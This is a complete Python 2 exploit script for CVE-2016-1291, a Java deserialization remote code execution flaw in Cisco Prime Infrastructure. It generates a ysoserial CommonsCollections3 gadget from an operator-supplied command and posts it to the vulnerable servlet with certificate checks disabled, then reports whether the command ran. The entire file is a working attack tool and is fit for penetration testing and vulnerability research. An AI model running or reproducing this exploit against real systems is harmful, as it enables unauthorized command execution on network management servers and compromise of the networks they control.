#! /usr/bin/env python2
#Cisco Prime Infrastucture Java Deserialization RCE (CVE-2016-1291)
#Based on the nessus plugin cisco_prime_infrastucture_20161291.nasl
#Made with <3 by @byt3bl33d3r

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

import argparse
import sys
from binascii import hexlify, unhexlify
from subprocess import check_output

parser = argparse.ArgumentParser()
parser.add_argument('target', type=str, nargs='?', help='Target IP:PORT')
parser.add_argument('--cmd', type=str, help='Command to run on target')
parser.add_argument('--proto', choices={'http', 'https'}, default='https', help='Send exploit over http or https (default: https)')

if len(sys.argv) < 2:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

if len(args.target.split(':')) != 2:
    print '[-] Target must be in format IP:PORT'
    sys.exit(1)

if not args.cmd:
    print '[-] You must specify a command to run'
    sys.exit(1)

ip, port = args.target.split(':')

print '[*] Target IP: {}'.format(ip)
print '[*] Target PORT: {}'.format(port)

payload = 'aced0005771d001b492068616420736f6d657468696e6720666f7220746869732e2e2e'

gadget = check_output(['java', '-jar', './ysoserial-0.0.4-all.jar', 'CommonsCollections3', args.cmd])

payload += hexlify(gadget[4:])

r = requests.post('{}://{}:{}/xmp_data_handler_service/xmpDataOperationRequestServlet'.format(args.proto, ip, port), verify=False, data=unhexlify(payload))
if r.status_code == 200 and 'InstantiateTransformer: Constructor threw an exception' in r.text:
	print '[+] Command executed successfully'
